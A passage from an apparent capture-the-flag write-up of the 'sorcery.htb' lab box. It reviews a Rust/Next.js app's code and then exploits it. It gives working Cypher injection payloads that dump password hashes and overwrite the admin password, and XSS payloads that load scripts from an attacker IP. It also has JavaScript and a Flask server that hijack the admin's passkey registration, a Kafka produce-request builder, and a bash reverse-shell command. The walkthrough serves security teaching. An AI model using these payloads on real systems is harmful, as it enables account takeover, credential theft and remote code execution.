};
```

Authenticating with a passkey is two unauthenticated endpoints. `start_authentication.rs` takes a username, looks up the registered passkey for that user, and returns a WebAuthn challenge. `finish_authentication.rs` verifies the browser’s assertion and, on success, issues a JWT identical to the password path except for `with_passkey: true`:

```rust
let claim = UserClaims {
    id: user.id,
    username: user.username.to_owned(),
    privilege_level: user.privilege_level,
    with_passkey: true,
    only_for_paths: None,
    exp: SystemTime::now().add(Duration::from_secs(60 * 60 * 24))
        .duration_since(UNIX_EPOCH).unwrap().as_secs() as usize,
};
```

The frontend passkey flow (`app/auth/passkey/page.tsx`) is the standard SimpleWebAuthn flow:

```ts
const startResponse = await startAuthentication(username);
const challenge = startResponse.result!.challenge;
const credential = await invokeAuthenticator(challenge.publicKey);
const finishResponse = await finishAuthentication(username, credential);
const user = User.fromJwt(finishResponse.result!.token);
await user.save();
router.push("/dashboard");
```

The browser’s authenticator signs the challenge, sends the assertion to `finish`, decodes the returned JWT, stores it, and redirects to the dashboard. This matches what I saw earlier where the Chrome WebAuthn emulator was sufficient to complete the login.

To recap the three flows and what ends up in the JWT:

| Flow | Endpoint(s) | Creds checked | `privilege_level` | `with_passkey` |
| --- | --- | --- | --- | --- |
| Register | `POST /api/auth/register` | (none - creates account) | `Seller` if `registrationKey` matches, else `Client` | n/a |
| Password login | `POST /api/auth/login` | Argon2 verify | from `PRIVILEGES` at login time | `false` |
| Passkey login | `POST /api/webauthn/passkey/authenticate/{start,finish}` | WebAuthn assertion | from `PRIVILEGES` at login time | `true` |

#### Products

The `Product` model is defined in `db/models/product.rs`:

```rust
#[derive(Model, Serialize, Deserialize)]
pub struct Product {
    pub id: String,
    pub name: String,
    pub description: String,
    pub is_authorized: bool,
    pub created_by_id: String,
}

impl Product {
    pub fn should_show_for_user(&self, claims: &UserClaims) -> bool {
        self.is_authorized
            || claims.privilege_level == UserPrivilegeLevel::Admin
            || self.created_by_id == claims.id
    }
}
```

A product is visible to a user if it is flagged `is_authorized`, or the caller is an `Admin`, or the caller created it. Everything seeded in `initial_data.rs` is created by the admin user with `is_authorized: true`, which is why a fresh `Client` account sees the full pre-populated catalog.

The functions used to get products are in `get_all.rs` and `get_one.rs`. Both sit behind the `RequireClient` guard (so any logged-in user can hit them) and apply `should_show_for_user` as a post-fetch filter. `get_one` returns `NotFound` when the product exists but the user can’t see it, so existence isn’t leaked. The product IDs are `Uuid::new_v4()` strings, which matches the GUIDs I noticed earlier in the dashboard URLs. These functions use the `Product::get_by_id(id.to_owned())` and `Product::get_all()` methods. Of most interest is `get_by_id` called with the `id` variable, where `id` is the string after `/dashboard/store/` in the URL, whatever string the user dropped into the URL.

`get_by_id` isn’t a function in the Rust code, but rather a macro derived from `backend-macros`. The relevant chunk of `backend-macros/src/lib.rs`:

```rust
let get_functions = fields.iter().map(|&FieldWithAttributes { field, .. }| {
    let name = field.ident.as_ref().unwrap();
    let type_ = &field.ty;
    let name_string = name.to_string();
    let function_name = syn::Ident::new(
        &format!("get_by_{}", name_string),
        proc_macro2::Span::call_site(),
    );

    quote! {
        pub async fn #function_name(#name: #type_) -> Option<Self> {
            let graph = crate::db::connection::GRAPH.get().await;
            let query_string = format!(
                r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
                #struct_name, #name_string, #name
            );
            let row = match graph.execute(
                ::neo4rs::query(&query_string)
            ).await.unwrap().next().await {
                Ok(Some(row)) => row,
                _ => return None
            };
            Self::from_row(row).await
        }
    }
});
```

The user-supplied value is concatenated straight into the Cypher query with `format!`, with no parameter binding and no escaping. I’ll come back to this shortly.

`insert.rs` defines the `insert_product` method, which is gated by `RequireSeller`, so a plain `Client` cannot create products:

```rust
#[post("/", data = "<data>")]
pub async fn insert_product(
    guard: RequireSeller,
    browser_store: &State<BrowserStore>,
    data: Json<Request>,
) -> Result<Json<Response>, AppError> {
    let id = Uuid::new_v4().to_string();
    let product = Product {
        id: id.to_string(),
        name: data.name.clone(),
        description: data.description.clone(),
        is_authorized: false,
        created_by_id: guard.claims.id,
    };
    product.save().await;
```

The new product is saved with `is_authorized: false` and `created_by_id` set to the caller, leaving the product only visible to the user who created it and the admin. Then this happens:

```rust
let user = User::get_by_username("admin".to_string()).await.unwrap();
let claim = UserClaims {
    id: user.id,
    username: user.username.to_owned(),
    privilege_level: user.privilege_level,
    with_passkey: true,
    only_for_paths: Some(vec![
        r"^\/api\/product\/[a-zA-Z0-9-]+$".to_string(),
        r"^\/api\/webauthn\/passkey\/register\/start$".to_string(),
        r"^\/api\/webauthn\/passkey\/register\/finish$".to_string(),
    ]),
    exp: SystemTime::now()
        .add(Duration::from_secs(60))
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() as usize,
};
let token = encode(
    &Header::default(),
    &claim,
    &EncodingKey::from_secret(JWT_SECRET.as_bytes()),
)
.unwrap();
```

The backend mints a JWT for the `admin` user on the spot. The token has `with_passkey: true`, an expiry of 60 seconds, and `only_for_paths` populated with three endpoints: `GET /api/product/<id>` (so the bearer can fetch product details) and the two halves of passkey registration (`/api/webauthn/passkey/register/start` and `/finish`). Recall from earlier that `RequireAuthentication` enforces this whitelist, so this admin token is genuinely useless against any other route.

Then it spins up a headless Chrome instance, sets that token as a cookie, and visits the new product:

```rust
let semaphore = browser_store.semaphore.clone();
    tokio::task::spawn(async move {
        let _permit = semaphore.acquire().await.unwrap();

        let url = format!("{}/dashboard/store/{}", &*INTERNAL_FRONTEND, product.id);

        let launch_options = LaunchOptions {
            port: Some(rand::thread_rng().gen_range(8000..9000)),
            sandbox: false,
            ..Default::default()
        };
        let browser = Browser::new(launch_options).unwrap();
        let tab = browser.new_tab().unwrap();

        tab.set_cookies(vec![CookieParam {
            name: "token".to_string(),
            value: token,
            url: Some(INTERNAL_FRONTEND.clone()),
            domain: None,
            path: None,
            secure: None,
            http_only: Some(true),
            same_site: None,
            expires: None,
            ...
        }])
        .unwrap();

        tab.navigate_to(&url.clone()).unwrap();
        tab.wait_until_navigated().unwrap();

        tokio::time::sleep(Duration::from_secs(10)).await;

        drop(browser);
    });
    Ok(Json(Response { id }))
}
```

So every `POST /api/product` call triggers an admin-authenticated headless Chrome to load `/dashboard/store/<new_product_id>`, wait ten seconds, and quit.

It’s a bit unusual to see a bot built into the page itself, but it seems to be simulating an admin user visiting every product that’s submitted.

The frontend page that gets loaded (`app/dashboard/store/[product]/page.tsx`) is the same one I see when I click into a product as a logged-in client. Whatever the page renders for the product’s `name` and `description` will be rendered with admin-cookie context inside the bot’s Chrome.

That page is short:

```ts
async function _ProductPage({ params }: { params: { product: string } }) {
  const response = await API().get(\`product/${params.product}\`);

  if (response.status === 404) {
    return notFound();
  }

  const { product } = (await response.json()) as Response;

  return (
    <Card className="flex flex-col">
      <CardHeader>
        <CardTitle>
          <p className="text-3xl">{product.name}</p>
        </CardTitle>
      </CardHeader>
      <CardContent className="flex flex-col flex-1">
        <p
          className="mb-4 text-xl"
          dangerouslySetInnerHTML={{
            __html: product.description,
          }}
        />
      </CardContent>
    </Card>
  );
}
```

`product.name` is rendered as a normal React child (`<p>{product.name}</p>`), so React escapes it. But `product.description` is fed straight into `dangerouslySetInnerHTML`, which sets the raw HTML on the element without any escaping or sanitization. Whatever bytes a seller put into `description` end up parsed as HTML on the page, including `<script>` tags or inline event handlers.

#### DNS Management

The `/dashboard/dns` page is the first of three dashboard pages that require both an admin login and a passkey-backed session. The frontend wraps it in `requireAuth(_, 2).then(requirePasskey)` from `protect/protect.tsx`:

```ts
export async function requireAuth(
  Component: (props: any) => Promise<React.ReactElement>,
  privilege?: number,
) {
  const user = await maybeGetUserOnServer();
  if (user === null) {
    return NotFound;
  }
  if (user.privilegeLevel < (privilege ?? 0)) {
    return NotFound;
  }
  return Component;
}
```

`requireAuth(_, 2)` rejects anyone whose JWT `privilegeLevel` is below `2` (Admin), and `requirePasskey` then rejects anyone whose `withPasskey` claim is `false`. The corresponding backend handlers stack the `RequireAdmin` and `RequirePasskey` guards to enforce the same two conditions server-side.

The page itself shows a table of name / value entries and a “Force Records Re-fetch” button. It calls `GET /api/dns` to populate the table and `POST /api/dns` to refresh it.

`api/dns/get.rs` just returns the in-memory cache that the Kafka background thread keeps up to date:

```rust
#[get("/")]
pub fn get_entries(_guard1: RequireAdmin, _guard2: RequirePasskey) -> Json<Response> {
    Json(Response {
        entries: DNS.lock().unwrap().entries.clone(),
    })
}
```

`api/dns/update.rs` is the producer side of the Kafka pipeline. It publishes a fixed string to the `update` topic:

```rust
#[post("/")]
pub fn update_dns(
    _guard1: RequireAdmin,
    _guard2: RequirePasskey,
    kafka_store: &State<KafkaStore>,
) -> Result<Json<Response>, AppError> {
    let mut producer = kafka_store.producer.lock().unwrap();

    match producer.send(&Record {
        topic: "update",
        partition: -1,
        key: (),
        value: "/dns/convert.sh".as_bytes(),
    }) {
        Ok(_) => Ok(Json(Response {})),
        Err(_) => Err(AppError::Unknown),
    }
}
```

The message body is hardcoded to `/dns/convert.sh`, which is the script in the `dns` container that rebuilds `/dns/entries` from the host files. From [above](#dns), the dns container’s Rust consumer pipes that whole string into `bash -c`, so this endpoint causes the dns container to re-run `convert.sh` and then publish the fresh entry list back on the `get` topic.

#### Debug Port Tool

`/dashboard/debug` is a form that takes a host, port, optional hex-encoded payload(s), and two checkboxes (“Expect response?” and “Keep alive?”). It’s marketed in the UI as `Easily debug ports by sending raw data to them and optionally expecting a response`. The backend at `api/debug/debug.rs` is exactly that:

```rust
#[derive(Deserialize)]
struct Request {
    host: String,
    port: u16,
    data: Vec<String>,
    #[serde(default)]
    expect_result: bool,
    #[serde(default)]
    keep_alive: bool,
}

#[post("/port", data = "<data>")]
pub fn port_data(
    _guard1: RequireAdmin,
    _guard2: RequirePasskey,
    data: Json<Request>,
) -> Result<Json<Response>, AppError> {
    let Ok(mut stream) = TcpStream::connect(format!("{}:{}", data.host, data.port)) else {
        return Err(AppError::NotFound);
    };

    if stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .is_err()
    {
        return Err(AppError::Unknown);
    }

    let mut response: Option<Vec<String>> = match data.expect_result {
        true => Some(vec![]),
        false => None,
    };

    for request in data.data.iter() {
        let Ok(to_send) = hex::decode(request) else {
            return Err(AppError::WrongInput);
        };

        if stream.write(to_send.as_slice()).is_err() {
            return Err(AppError::Unknown);
        }

        if data.expect_result {
            let mut result = Vec::new();
            stream.read_to_end(&mut result).ok();
            response.as_mut().unwrap().push(hex::encode(&result));
        }
    }

    if data.keep_alive {
        tokio::task::spawn(async move {
            let _ = stream;
            tokio::time::sleep(Duration::from_secs(60)).await;
            drop(stream);
        });
    }

    Ok(Json(Response { data: response }))
}
```

It opens a raw `TcpStream` to whatever `host:port` the caller specifies, hex-decodes each string in `data` and writes it to the socket, and (if `expect_result` is set) reads the response back and returns the bytes as hex. With `keep_alive`, the socket is held open for 60 seconds after the response is returned. There’s no allowlist on `host` or `port`, no protocol filter, and no recipient validation. From the backend’s perspective inside the Docker network, that’s a generic SSRF primitive that can speak any TCP protocol to any internal service.

#### Blog

`/dashboard/blog` is the third admin-gated page. The frontend wraps it in the same `requireAuth(_, 2).then(requirePasskey)` pair:

```ts
export default async function BlogPage<T>(props: T) {
  const Component = await requireAuth(_BlogPage, 2).then(requirePasskey);

  return <Component {...props} />;
}
```

Server-side, however, the backend handler in `api/blog/get.rs` has no guard at all:

```rust
#[get("/")]
pub async fn get_blog_posts() -> Result<Json<Response>, AppError> {
    Ok(Json(Response {
        posts: Post::get_all().await,
    }))
}
```

So the access control on the blog is enforced only by the frontend page wrapper. A direct call to `GET /api/blog` does not require any authentication and returns every post. Two posts are created in the [initial database seed](#backend).

## sorcery.htb admin Access

I’m showing first the intended path to admin access on the website. I actually took an unintended shortcut for this access, which I’ll include [at the bottom of this section](#shortcut-to-admin).

### Access as Seller

#### Cypher Crash POC

I noted [above](#products) that the GUID at the end of `/dashboard/store/<GUID>` is used to build a Cypher query for the Neo4j database, and that it didn’t appear to have any filtering on the input. If I change the GUID to something that doesn’t exist in the database, it returns 404:

![image-20260416102611290](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416102611290.webp)

However, if I add a double quote to the end, it crashes:

![image-20260416102651025](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416102651025.webp)

#### Cypher Query Injection

The crash comes from the `Model` derive macro in `backend-macros/src/lib.rs`:

```rust
quote! {
    pub async fn #function_name(#name: #type_) -> Option<Self> {
        let graph = crate::db::connection::GRAPH.get().await;
        let query_string = format!(
            r#"MATCH (result: {} {{ {}: "{}" }}) RETURN result"#,
            #struct_name, #name_string, #name
        );
        let row = match graph.execute(
            ::neo4rs::query(&query_string)
        ).await.unwrap().next().await {
            Ok(Some(row)) => row,
            _ => return None
        };
        Self::from_row(row).await
    }
}
```

For `Product::get_by_id("aaa")`, that builds the literal Cypher:

```
MATCH (result: Product { id: "aaa" }) RETURN result
```

The `id` value is concatenated into the query with no escaping and no parameter binding, so the closing double quote of the value can be smuggled in by the caller, breaking out of the string literal. From there I can close the property map and the opening parenthesis with `})`, attach any Cypher I like, and comment out the original trailing `RETURN result` with `//`.

The pieces I need to keep in mind:

- `from_row` expects the result column to be aliased `result` and to deserialize as a `BoltMap` (a Cypher map). Returning a node directly (e.g. `RETURN n AS result`) won’t match the type. A map literal like `RETURN { ... } AS result` does.
- The map has to contain every Product field that `from_row` reads (`id`, `name`, `description`, `is_authorized`, `created_by_id`). Any missing key triggers a `.expect("<name> not found")` panic in the macro-generated code.
- The post-fetch filter `should_show_for_user` still runs on the returned object. The simplest way to satisfy it is to set `is_authorized: true` in the injected map.

The page will process the first `BoltMap` that comes back and expects it to have specific columns from the `Product` model. I want an injection that will return no `Product` nodes and a single row from something else. To achieve this, I’ll wrap a synthetic row in `UNION ALL`. The first half of the union returns whatever the original `MATCH` finds (zero rows here), and the second half is a standalone `RETURN { ... } AS result` that always emits one row. `UNION` only requires the column names to match (both halves alias the column `result`), not the column types, so the synthetic map happily unions with a (possibly empty) set of `Product` nodes. Turns out I could also just stack the queries, as I’ll show [later](#password-hash-overwrite), but for this section I’ll show `UNION`.

An example POC with synthetic injected data:

```
x" }) RETURN result UNION ALL RETURN { id: "pwn", name: "injected", description: "hello from cypher", is_authorized: true, created_by_id: "pwn" } AS result //
```

On the server, that will become:

```
MATCH (result: Product { id: "x" }) RETURN result UNION ALL RETURN { id: "pwn", name: "injected", description: "hello from cypher", is_authorized: true, created_by_id: "pwn" } AS result //" }) RETURN result
```

This encodes to an HTTP request in Burp Repeater:

```
GET /dashboard/store/x%22%20%7D%29%20RETURN%20result%20UNION%20ALL%20RETURN%20%7B%20id%3A%20%22pwn%22%2C%20name%3A%20%22injected%22%2C%20description%3A%20%22hello%20from%20cypher%22%2C%20is%5Fauthorized%3A%20true%2C%20created%5Fby%5Fid%3A%20%22pwn%22%20%7D%20AS%20result%20%2F%2F HTTP/1.1

Accept: text/html
Connection: close
```

It was important for me to clear out the `Next` headers to get this to move to the backend. With those set, Next.js answers with a router prefetch and never renders the page or calls the backend. Stripping them forces a full page render, which triggers the API call, which triggers the Cypher injection, and the injected `name` and `description` show up rendered into the HTML response.

![image-20260416124656216](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416124656216.webp)

That confirms a working injection. I should be able to run any Cypher I want and shape the result into a Product and have it displayed.

#### Read User Data

I’ll use the injection to read data about the users. I’ll need to get the user data and then convert it to an object with the `Product` attributes. To do that, I’ll get all the `Users`, and pass that to `reduce`, which will generate one long string with all the users and passwords. Then I can return a synthetic object with `id`, `name`, `description`, and `created_by_id`, where I put the exfiled data into `description`.

```
x" }) RETURN result UNION ALL MATCH (u: User) WITH reduce(s = "", x IN collect(u.username + ":" + u.password) | s + x + "<br>") AS desc RETURN { id: "users", name: "all-users", description: desc, is_authorized: true, created_by_id: "x" } AS result //
```

That renders to:

```
MATCH (result: Product { id: "x" }) RETURN result UNION ALL MATCH (u: User) WITH reduce(s = "", x IN collect(u.username + ":" + u.password) | s + x + "<br>") AS desc RETURN { id: "users", name: "all-users", description: desc, is_authorized: true, created_by_id: "x" } AS result //" }) RETURN result
```

Sending this returns the admin and my users’ hashes:

Argon2 is very hard to crack, and doesn’t crack with `hashcat` and `rockyou.txt`.

#### Read Registration Key

Turning from users, I’ll try to get the `registrationKey` value necessary to [register as a seller](#register-as-seller). On registering, the submitted value is compared against a `Config` model that’s defined in `db/connection.rs`:

```rust
#[derive(Deserialize, Model)]
struct Config {
    is_initialized: bool,
    registration_key: String,
}
```

I’ll create an injection payload that will get the `Config` node and project its `registration_key` into the synthetic Product’s `name` so it shows up in plain text in the rendered title:

```
x" }) RETURN result UNION ALL MATCH (c: Config) RETURN { id: "config", name: c.registration_key, description: "registration key", is_authorized: true, created_by_id: "x" } AS result //
```

Which renders to:

```
MATCH (result: Product { id: "x" }) RETURN result UNION ALL MATCH (c: Config) RETURN { id: "config", name: c.registration_key, description: "registration key", is_authorized: true, created_by_id: "x" } AS result //" }) RETURN result
```

URL-encoded into Burp Repeater:

The registration key is “dd05d743-b560-45dc-9a09-43ab18c7a513”.

#### Register as Seller

I’ll create a new account using this key:

![image-20260416155025908](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416155025908.webp)

Now there’s an extra option in the menu bar:

![image-20260416155048783](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416155048783.webp)

It presents an option to create items:

![image-20260416155112625](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416155112625.webp)

If I add one, it does show on my page:

![image-20260416155449725](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416155449725.webp)

I know from the [code review](#products) that right now only my user and the admin can see it, and that the admin checks it immediately.

### Access as Admin

#### XSS Local POC

I noted [above](#products) that the description field was not sanitized, and thus vulnerable to XSS. To test this, I’ll create a very simple payload:

![image-20260416160354840](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416160354840.webp)

Now I’ll load the new item page. Just clicking the view link loads the page but doesn’t pop an alert. However, refreshing the page from this URL does:

![image-20260416160445201](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416160445201.webp)

That’s because Next.js does a soft RSC navigation on the click that doesn’t reliably re-trigger the inserted element’s load handlers, while a refresh re-parses the HTML from scratch and `onerror` fires.

#### XSS Remote POC

To test the XSS on the admin, I’ll create a payload that will request a script from my host and load it:

```html
<img src=http://10.10.14.61/x.jpg onerror="var s=document.createElement('script');s.src='http://10.10.14.61/poc.js';document.head.appendChild(s)">
```

What’s nice about this is that it should try to contact my server at least twice. First to read `x.jpg` (which does not exist), and then to load the script, `poc.js`. I’ll have `poc.js` make another request back to me:

```js
fetch("http://10.10.14.61/hit?u=" + encodeURIComponent(location.href) + "&c=" + document.cookie);
```

On sending the `img` payload in the product description, within a couple seconds I get all three hits on my webserver:

```
10.129.25.147 - - [19/Apr/2026 03:15:52] code 404, message File not found
10.129.25.147 - - [19/Apr/2026 03:15:52] "GET /x.jpg HTTP/1.1" 404 -
10.129.25.147 - - [19/Apr/2026 03:15:52] "GET /poc.js HTTP/1.1" 200 -
10.129.25.147 - - [19/Apr/2026 03:15:52] code 404, message File not found
10.129.25.147 - - [19/Apr/2026 03:15:52] "GET /hit?u=http%3A%2F%2Ffrontend%3A3000%2Fdashboard%2Fstore%2F7e578c7b-0960-4090-bbb0-e033974aa70c&c= HTTP/1.1" 404 -
```

The cookie is empty, which is expected as I noted [above](#register-and-password-login) that it was `httpOnly`. Still, this shows that I have full XSS to do whatever I want in `poc.js`.

#### XSS Register Passkey

When the bot visits the product, the admin JWT cookie is set with limited applicability:

```rust
only_for_paths: Some(vec![
    r"^\/api\/product\/[a-zA-Z0-9-]+$".to_string(),
    r"^\/api\/webauthn\/passkey\/register\/start$".to_string(),
    r"^\/api\/webauthn\/passkey\/register\/finish$".to_string(),
]),
```

In addition to viewing products, the token can hit the two passkey registration endpoints. The plan: register a passkey I control on the admin’s account, then authenticate as admin using that passkey.

I can’t use `navigator.credentials.create` from the XSS because the bot’s headless Chrome has no authenticator, and the RP ID (`sorcery.htb`) doesn’t match the bot’s origin (`http://frontend:3000`). Instead, I’ll call the Next.js server actions directly via `fetch` and handle credential creation on my own server.

In Next.js, server actions can be invoked by sending POST requests to any same-origin URL with a `Next-Action` header containing the action’s build-time ID. The cookie attaches automatically, and the Next.js server forwards it as `Authorization: Bearer` to the backend. I can get the action ID for passkey enrollment by watching the request in Burp Proxy. For example, when I enroll a passkey (with the Chrome dev tools fake passkey working), it sends two POST requests, both to `/dashboard/profile`. The first looks like:

```
POST /dashboard/profile HTTP/1.1
Host: sorcery.htb

```

The `Next-Action` header of 062f18334e477c66c7bf63928ee38e241132fabc shows the `startRegistration` action ID. In the next POST, there’s an action ID of 60971a2b6b26a212882926296f31a1c6d7373dfa for `finishRegistration`.

The XSS payload (`passkey.js`) is three fetch calls:

```js
(async () => {
    const SERVER = 'http://10.10.14.61';
    const START_ACTION = '062f18334e477c66c7bf63928ee38e241132fabc';
    const FINISH_ACTION = '60971a2b6b26a212882926296f31a1c6d7373dfa';

    // Step 1: Call startRegistration server action
    const startResp = await fetch('/dashboard/profile', {
        method: 'POST',
        body: '[]',
        headers: {
            'Next-Action': START_ACTION,
            'Content-Type': 'text/plain;charset=UTF-8',
        },
    });
    const startText = await startResp.text();
    const challengeJson = JSON.parse(startText.split('\n')[1].substring(2));
    const challenge = challengeJson.result.challenge;

    // Step 2: Send challenge to our server, get credential back
    const solveResp = await fetch(SERVER + '/solve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            challenge: challenge.publicKey.challenge,
            rp: challenge.publicKey.rp,
        }),
    });
    const credential = await solveResp.json();

    // Step 3: Call finishRegistration server action
    await fetch('/dashboard/profile', {
        method: 'POST',
        body: JSON.stringify([credential]),
        headers: {
            'Next-Action': FINISH_ACTION,
            'Content-Type': 'text/plain;charset=UTF-8',
        },
    });

    new Image().src = SERVER + '/done';
})();
```

In step 1, it sends a POST to `/dashboard/profile`. Because this is a same-origin request, the admin cookie attaches automatically. The Next.js server reads it and forwards the request to the backend with the JWT. The response comes back with a payload that contains JSON with the WebAuthn challenge. In step 2, the XSS extracts the challenge and sends it to my Flask server, which generates a keypair, builds the attestation, and returns a `RegistrationResponseJSON` object. In step 3, that credential is passed directly as `[credential]` to the `finishRegistration` server action, again same-origin with the admin cookie attached. Once the registration is complete, it sends a request back to `/done` on my server.

The Flask server (`pk_server.py`) handles three things: serving `passkey.js`, generating the credential at `/solve`, and using those credentials to login at `/done`:

This server took a lot of work and assists from Claude.

A few details that took some iteration to get right:

- | The flags byte in the registration `authData` is `\x45` (UP | UV | AT = `0x01 \| 0x04 \| 0x40`), not `\x41`. The backend’s `webauthn_rs` requires user verification for passkey registration (`userVerification: "required"` in the challenge options), so the UV bit must be set. |
	| --- | --- | --- |
- The credential returned by `/solve` must nest `attestationObject` and `clientDataJSON` under a `response` object to match the `RegistrationResponseJSON` format. Returning them at the top level silently fails on deserialization.
- The `clientDataJSON` for both registration and authentication sets `origin` to `https://sorcery.htb`, matching the backend’s configured `rp_origin`. The bot’s actual page origin (`http://frontend:3000`) doesn’t matter since we’re building `clientDataJSON` on our server, not in the browser.
- CORS headers are required on the Flask server because the XSS’s `fetch` to `/solve` is cross-origin (page on `http://frontend:3000`, server on `http://10.10.14.61`).

The `/done` endpoint does double duty as the XSS completion beacon AND the login trigger. When the bot’s XSS hits `GET /done`, the Flask server immediately calls `startAuthentication("admin")` and `finishAuthentication("admin", credential)` via the same Next.js server action mechanism using `requests`, signing the authentication challenge with the private key it generated during `/solve`. The passkey authentication action IDs (`1efff30d879f3aea7d899128311edf11046f4a10` and `5aa9f80bc40bd5a48cfafdb9fff8913dfa09619f`) were discovered the same way as the registration ones, by observing a passkey login in Burp Proxy.

With all of that in place, I’ll trigger the flow by creating a new product with the following description:

```html

Setting that JWT as the `token` cookie on `sorcery.htb` provides a session as admin:

### Shortcut to Admin

#### Shortcut

There’s a much simpler path that skips the Seller and the XSS entirely, which I initially took when solving:

```

style identifier fill:#1d1d1d,color:#FFFFFFFF;
```

#### Password Hash Overwrite

I’ll create an argon2 hash using Python:

```
oxdf@hacky$ uv run --with argon2-cffi python3 -c "from argon2 import PasswordHasher; print(PasswordHasher().hash('0xdf0xdf'))"
$argon2id$v=19$m=65536,t=3,p=4$ZUP5b+TWW4WvhSmIz5aCNg$dbpp0ZmZHXXL5sLNAmJFhNUEIqx/iJupxP1reWz+WlM
```

Now I’ll use this injection to set the admin user’s `password` field:

```
<real UUID>"}) MATCH (u: User { username: "admin" }) SET u.password = "$argon2id$v=19$m=65536,t=3,p=4$ZUP5b+TWW4WvhSmIz5aCNg$dbpp0ZmZHXXL5sLNAmJFhNUEIqx/iJupxP1reWz+WlM" RETURN { id: "x", name: "done", description: "password changed", is_authorized: true, created_by_id: "x" } AS result //
```

On the server that becomes:

```
MATCH (result: Product { id: "<real UUID>"}) MATCH (u: User { username: "admin" }) SET u.password = "$argon2id$v=19$m=65536,t=3,p=4$ZUP5b+TWW4WvhSmIz5aCNg$dbpp0ZmZHXXL5sLNAmJFhNUEIqx/iJupxP1reWz+WlM" RETURN { id: "x", name: "done", description: "password changed", is_authorized: true, created_by_id: "x" } AS result //" }) RETURN result
```

On injecting, the page indicates success:

![image-20260416225322032](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260416225322032.webp)

And I can login as admin using the new password, “0xdf0xdf”.

## Shell as user@dns

### Enumeration

#### Passkey

As admin, I have access to three new links on the menu bar:

![image-20260417173843430](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417173843430.webp)

As I noted during the source code review, each of them requires admin to be logged in via passkey to access. If I used the intended path that’s already true, but if I changed the admin’s password, it will show:

![image-20260417173924685](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417173924685.webp)

I can use the Chrome dev tools WebAuthn feature to add a passkey and use it to log in.

#### DNS

The DNS panel offers a list of DNS resolutions:

![image-20260417174105367](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417174105367.webp)

As the source code showed, clicking “Force Records Re-fetch” will…

#### Debug

Debug offers a service to send raw data to a specific host / port:

![image-20260417174327570](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417174327570.webp)

I’m giving it the hex encoded string “Testing!”. When I send, it hits `nc` on my host:

```
oxdf@hacky$ echo 'Right back at you!' | nc -lnvp 8000
Listening on 0.0.0.0 8000
Connection received on 10.129.25.147 50760
Testing!
^C
```

And the response shows up in hex on the web UI:

![image-20260417174551429](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417174551429.webp)

That data decodes back to “Right back at you!”. This data provides a way to send any raw data to any service I want, which will be quite useful.

#### Blog

The blog has two posts, just as I noted [above](#blog):

![image-20260417174644639](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260417174644639.webp)

Nothing new here.

### RCE

#### Strategy

As I noted in the source code analysis, the dns container subscribes to the Kafka topic `update` and pipes every message directly into `bash -c`. The Kafka broker has no authentication. So anyone who can reach `kafka:9092` on the Docker network and publish to the `update` topic gets command execution as the `user` account inside the `dns` container.

The Debug port tool gives me exactly that reach. It opens a raw TCP socket to any `host:port` on the Docker network and sends hex-encoded bytes. To exploit it, I need to craft a valid Kafka Produce request in raw binary that publishes a shell command to the `update` topic.

#### Kafka Protocol

I’ll use the [Kafka docs](https://kafka.apache.org/42/design/protocol/) plus a lot of Claude to build an understanding of the Kafka wire protocol:

```
[4-byte size][request header][produce body]

Request header: api_key(2) + api_version(2) + correlation_id(4) + client_id(2+N)
Produce body: required_acks(2) + timeout(4) + topic_count(4) +
  topic_name(2+N) + partition_count(4) +
  partition_id(4) + message_set_size(4) +
  offset(8) + message_size(4) +
  crc(4) + magic(1) + attributes(1) + key_len(4) + value_len(4) + value(N)
```

Rather than build this by hand, I’ll use a short Python script to generate the hex payload:

```python
import binascii
import struct
import sys

if len(sys.argv) != 2:
    print(f"usage: {sys.argv[0]} <cmd>")
    sys.exit(1)

def kafka_produce_hex(topic, message):
    value = message.encode()

    # Message v0: magic=0, attributes=0, key=null, value=command
    msg_body = struct.pack('>bb', 0, 0)
    msg_body += struct.pack('>i', -1)
    msg_body += struct.pack('>i', len(value)) + value
    crc = binascii.crc32(msg_body) & 0xffffffff
    full_msg = struct.pack('>I', crc) + msg_body

    # MessageSet: offset=0 + message
    msg_set = struct.pack('>q', 0) + struct.pack('>i', len(full_msg)) + full_msg

    # Partition 0
    partition = struct.pack('>i', 0) + struct.pack('>i', len(msg_set)) + msg_set

    # Topic
    topic_b = topic.encode()
    topic_data = struct.pack('>h', len(topic_b)) + topic_b
    topic_data += struct.pack('>i', 1) + partition

    # Produce request: acks=1, timeout=5000, 1 topic
    body = struct.pack('>hi', 1, 5000) + struct.pack('>i', 1) + topic_data

    # Header: api_key=0 (Produce), api_version=0, correlation_id=1, client_id="0xdf"
    client = b'0xdf'
    header = struct.pack('>hhi', 0, 0, 1) + struct.pack('>h', len(client)) + client

    request = header + body
    return (struct.pack('>i', len(request)) + request).hex()

print(kafka_produce_hex("update", sys.argv[1]))
```

Typically I try to start with something like `ping` to check for RCE before going for a full reverse shell, but as I know this is a container, it’s likely that `ping` isn’t installed (I could check the `Dockerfile` to be sure). I’ll go for a reverse shell:

```
oxdf@hacky$ uv run kafka_msg.py 'bash -i >& /dev/tcp/10.10.14.61/443 0>&1'
